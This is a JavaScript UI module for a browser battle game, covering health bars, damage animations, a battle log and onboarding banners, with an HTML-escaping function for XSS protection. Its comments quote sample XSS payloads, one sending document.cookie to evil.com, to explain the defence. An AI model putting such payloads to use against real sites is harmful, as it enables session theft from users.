// UI Manager
// Handles all UI updates, messages, and display functions

// ============================================
// SECURITY: HTML Escape Function (XSS Prevention)
// ============================================
// This function converts dangerous HTML characters to safe entities.
// Without this, attackers could inject <script> tags or event handlers
// like <img onerror="malicious_code()"> through user input fields.
//
// Example attack prevented:
//   Input: <img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">
//   After escape: &lt;img src=x onerror=&quot;fetch(...)&quot;&gt;
//   Browser renders as text, not executable HTML
// ============================================
function escapeHtml(text) {
    if (text === null || text === undefined) {
        return '';
    }
    // Convert to string in case of numbers or other types
    const str = String(text);
    
    // Create a text node and extract its escaped content
    // This is the safest method as it uses the browser's built-in escaping
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

// Update the health bar UI (call this for percentage updates only)
function updateHealthBar(team, health) {
    const healthBar = document.getElementById(`${team}-health`);
    if (healthBar) {
        healthBar.style.width = `${health}%`;
        
        // Change color based on health
        if (health > 60) {
            healthBar.style.background = '#22c55e';
        } else if (health > 30) {
            healthBar.style.background = '#f59e0b';
        } else {
            healthBar.style.background = '#ef4444';
        }
    }
    
    // Update HP text display (e.g., "75/100")
    const hpText = document.getElementById(`${team}-hp-text`);
    if (hpText) {
        hpText.textContent = `${health}/100`;
        
        // Color the text based on health
        if (health > 60) {
            hpText.style.color = '#22c55e';
        } else if (health > 30) {
            hpText.style.color = '#f59e0b';
        } else {
            hpText.style.color = '#ef4444';
        }
    }
    
    // Update tower visual health (make crystal pulse or dim)
    updateTowerHealth(team, health);
}

// Show animated damage number above health bar
function showDamageNumber(team, damageAmount) {
    console.log(`[Damage Indicator] Showing -${damageAmount} HP for ${team} team`);
    
    // Find the player info container
    const playerInfo = document.querySelector(`.player-info .player-name.${team}-team`)?.parentElement;
    if (!playerInfo) {
        console.warn('Could not find player info container for team:', team);
        return;
    }
    
    // Create damage indicator element - MUCH BIGGER AND MORE VISIBLE
    const damageIndicator = document.createElement('div');
    damageIndicator.className = 'damage-indicator';
    damageIndicator.textContent = `-${damageAmount} HP`;
    damageIndicator.style.cssText = `
        position: absolute;
        top: -20px;
        left: 50%;
        transform: translateX(-50%);
        font-family: 'Press Start 2P', cursive;
        font-size: 24px;
        font-weight: bold;
        color: #fff;
        background: ${team === 'blue' ? 'linear-gradient(180deg, #3b82f6 0%, #1e40af 100%)' : 'linear-gradient(180deg, #ef4444 0%, #991b1b 100%)'};
        padding: 8px 16px;
        border-radius: 8px;
        border: 3px solid ${team === 'blue' ? '#60a5fa' : '#fca5a5'};
        box-shadow: 
            0 0 20px ${team === 'blue' ? '#60a5fa' : '#fca5a5'},
            0 0 40px ${team === 'blue' ? '#3b82f6' : '#ef4444'},
            4px 4px 0 rgba(0, 0, 0, 0.8);
        z-index: 10000;
        pointer-events: none;
        animation: damageFloat 2s ease-out forwards;
        white-space: nowrap;
    `;
    
    // Add to player info (positioned relative to health bar)
    playerInfo.style.position = 'relative';
    playerInfo.appendChild(damageIndicator);
    
    // Shake the health bar MORE intensely
    shakeHealthBar(team);
    
    // Flash effect on the entire player info box
    flashPlayerInfo(team);
    
    // Remove after animation completes
    setTimeout(() => {
        damageIndicator.remove();
    }, 2000);
}

// Flash player info box on damage
function flashPlayerInfo(team) {
    const playerInfo = document.querySelector(`.player-info .player-name.${team}-team`)?.parentElement;
    if (!playerInfo) return;
    
    // Add flash animation
    playerInfo.style.animation = 'damageFlash 0.5s ease-out';
    
    setTimeout(() => {
        playerInfo.style.animation = '';
    }, 500);
}

// Shake health bar on damage
function shakeHealthBar(team) {
    const healthBar = document.getElementById(`${team}-health`);
    if (!healthBar) return;
    
    const parent = healthBar.parentElement;
    if (!parent) return;
    
    // Add shake class
    parent.classList.add('health-bar-shake');
    
    // Remove after animation
    setTimeout(() => {
        parent.classList.remove('health-bar-shake');
    }, 500);
}

// Display reasoning text with typewriter effect in center of screen
function displayReasoning(reasoning, team) {
    // Only show once (not for both teams)
    if (team === 'red') return; // Skip the second call
    
    const centerBox = document.getElementById('center-reasoning');
    const textEl = document.getElementById('center-reasoning-text');
    
    if (!centerBox || !textEl) return;
    
    // Clear previous text
    textEl.textContent = '';
    
    // Show the box
    centerBox.classList.add('visible');
    
    // Typewriter effect
    let charIndex = 0;
    const typingSpeed = 50; // milliseconds per character
    
    function typeNextChar() {
        if (charIndex < reasoning.length) {
            textEl.textContent += reasoning.charAt(charIndex);
            charIndex++;
            setTimeout(typeNextChar, typingSpeed);
        } else {
            // After typing is complete, wait 5 seconds then fade out
            setTimeout(() => {
                centerBox.classList.remove('visible');
            }, 5000);
        }
    }
    
    typeNextChar();
}

// Display current concept on team's side
function displayConcept(concept, team, status) {
    const conceptEl = document.getElementById(`${team}-concept`);
    if (conceptEl) {
        const statusEmoji = status === 'waiting' ? '⏳' : '⚔️';
        conceptEl.textContent = `${statusEmoji} ${concept}`;
        conceptEl.style.opacity = '1';
    }
}

// Show temporary message
function showMessage(message, team) {
    const messageEl = document.getElementById(`${team}-message`);
    if (messageEl) {
        messageEl.textContent = message;
        messageEl.style.opacity = '1';
        
        setTimeout(() => {
            messageEl.style.opacity = '0';
        }, 1500);
    }
}

// Clear input fields
function clearInputs() {
    const blueInput = document.getElementById('blue-input');
    const redInput = document.getElementById('red-input');
    
    if (blueInput) blueInput.value = '';
    if (redInput) redInput.value = '';
    
    // Clear concept displays
    const blueConcept = document.getElementById('blue-concept');
    const redConcept = document.getElementById('red-concept');
    
    if (blueConcept) {
        blueConcept.style.opacity = '0';
        blueConcept.textContent = '';
    }
    if (redConcept) {
        redConcept.style.opacity = '0';
        redConcept.textContent = '';
    }
    
    console.log('Inputs and displays cleared, ready for next battle');
}

// Update battle log display
function updateBattleLog(entry) {
    const logContainer = document.getElementById('battle-log-content');
    if (!logContainer) return;
    
    const logEntry = document.createElement('div');
    logEntry.className = 'battle-log-entry';
    
    // SECURITY: Escape all user-controlled content to prevent XSS attacks
    // Without escaping, an attacker could enter concepts like:
    //   <script>steal_cookies()</script>
    //   <img src=x onerror="malicious_code()">
    // These would execute in the victim's browser!
    logEntry.innerHTML = `
        <div class="log-time">${escapeHtml(entry.timestamp)}</div>
        <div class="log-battle">${escapeHtml(entry.attack)} ⚔️ ${escapeHtml(entry.defend)}</div>
        <div class="log-reasoning">${escapeHtml(entry.reasoning)}</div>
        <div class="log-result">${escapeHtml(entry.result)} (-${escapeHtml(entry.damage)} HP)</div>
    `;
    
    logContainer.appendChild(logEntry);
    logContainer.scrollTop = logContainer.scrollHeight;
}

// Toggle battle log visibility
function toggleBattleLog() {
    const log = document.getElementById('battle-log');
    if (log) {
        log.classList.toggle('collapsed');
    }
}

// Update timer display UI
function updateTimerDisplay(timeMs) {
    const seconds = (timeMs / 1000).toFixed(1);
    const timerEl = document.getElementById('response-timer');
    const timerBarEl = document.getElementById('timer-bar');
    
    if (timerEl) {
        timerEl.textContent = `⏰ ${seconds}s to respond!`;
    }
    
    if (timerBarEl) {
        const percentage = (timeMs / 10000) * 100;
        timerBarEl.style.width = `${percentage}%`;
        
        // Change color based on urgency
        if (percentage > 50) {
            timerBarEl.style.background = '#22c55e';
        } else if (percentage > 25) {
            timerBarEl.style.background = '#f59e0b';
        } else {
            timerBarEl.style.background = '#ef4444';
        }
    }
}

// Hide timer display
function hideTimerDisplay() {
    const timerEl = document.getElementById('response-timer');
    if (timerEl) {
        timerEl.style.display = 'none';
    }
}

// Show AI thinking animation
function showAIThinking(team) {
    const messageEl = document.getElementById(`${team}-message`);
    if (messageEl) {
        messageEl.textContent = '🤖 AI THINKING...';
        messageEl.style.opacity = '1';
    }
    
    const conceptEl = document.getElementById(`${team}-concept`);
    if (conceptEl) {
        conceptEl.textContent = '⚙️ Preparing attack...';
        conceptEl.style.opacity = '1';
    }
}

// Display onboarding banner with interactive button
function displayOnboardingBanner(title, message, buttonText, callback) {
    const centerBox = document.getElementById('center-reasoning');
    const textEl = document.getElementById('center-reasoning-text');
    
    if (!centerBox || !textEl) return;
    
    // Clear previous content
    textEl.innerHTML = '';
    
    // Create title and message
    const titleEl = document.createElement('div');
    titleEl.style.fontSize = '14px';
    titleEl.style.marginBottom = '20px';
    titleEl.style.lineHeight = '1.8';
    titleEl.textContent = title;
    textEl.appendChild(titleEl);
    
    if (message) {
        const messageEl = document.createElement('div');
        messageEl.style.fontSize = '11px';
        messageEl.style.marginBottom = '25px';
        messageEl.style.lineHeight = '1.8';
        messageEl.style.whiteSpace = 'pre-wrap';
        messageEl.textContent = message;
        textEl.appendChild(messageEl);
    }
    
    // Create button
    const button = document.createElement('div');
    button.textContent = buttonText;
    button.className = 'attack-button blue-button';
    button.style.marginTop = '15px';
    button.style.cursor = 'pointer';
    button.style.pointerEvents = 'all';
    
    button.onclick = () => {
        // Hide banner
        centerBox.classList.remove('visible');
        centerBox.style.pointerEvents = 'none';
        
        // Call callback
        if (callback) {
            setTimeout(callback, 300);
        }
    };
    
    textEl.appendChild(button);
    
    // Enable pointer events for button interaction
    centerBox.style.pointerEvents = 'all';
    
    // Show the box
    centerBox.classList.add('visible');
}

// Get player-facing label for outcome type
function getOutcomeLabel(outcome_type) {
    const labels = {
        'direct_win': '✅ VICTORY',
        'direct_loss': '💀 DEFEATED',
        'backfire_win': '💥 BACKFIRE',  // Just BACKFIRE - no "win" for player perspective
        'neutral_no_damage': '🚫 INEFFECTIVE',
        'mutual_destruction': '⚔️ MUTUAL DESTRUCTION'
    };
    return labels[outcome_type] || '⚔️ BATTLE';
}

// Display reasoning with outcome label (new 5-outcome system)
// Returns a Promise that resolves when typewriter effect completes
function displayReasoningWithOutcome(explanation, outcome_type, team) {
    // Only show once (not for both teams)
    if (team === 'red') return Promise.resolve();
    
    const centerBox = document.getElementById('center-reasoning');
    const textEl = document.getElementById('center-reasoning-text');
    
    if (!centerBox || !textEl) return Promise.resolve();
    
    return new Promise((resolve) => {
        // Clear previous text
        textEl.textContent = '';
        
        // Get outcome label
        const outcomeLabel = getOutcomeLabel(outcome_type);
        
        // Show the box
        centerBox.classList.add('visible');
        
        // Create full text with label
        const fullText = `${outcomeLabel}\n\n${explanation}`;
        
        // Typewriter effect
        let charIndex = 0;
        const typingSpeed = 50; // milliseconds per character
        
        function typeNextChar() {
            if (charIndex < fullText.length) {
                textEl.textContent += fullText.charAt(charIndex);
                charIndex++;
                setTimeout(typeNextChar, typingSpeed);
            } else {
                // Typewriter complete!
                console.log('[Reasoning] Typewriter effect complete');
                
                // Check if in onboarding mode
                const inOnboarding = (typeof isOnboardingActive === 'function' && isOnboardingActive());
                
                if (inOnboarding) {
                    // In onboarding: Don't auto-hide, lesson banner will replace it
                    // Resolve immediately so lesson can show
                    console.log('[Reasoning] Onboarding mode - resolving immediately for lesson banner');
                    resolve();
                } else {
                    // Normal gameplay: Wait 5 seconds then fade out
                    console.log('[Reasoning] Normal mode - auto-hiding after 5 seconds');
                    setTimeout(() => {
                        centerBox.classList.remove('visible');
                    }, 5000);
                    // Resolve after fade starts
                    resolve();
                }
            }
        }
        
        typeNextChar();
    });
}

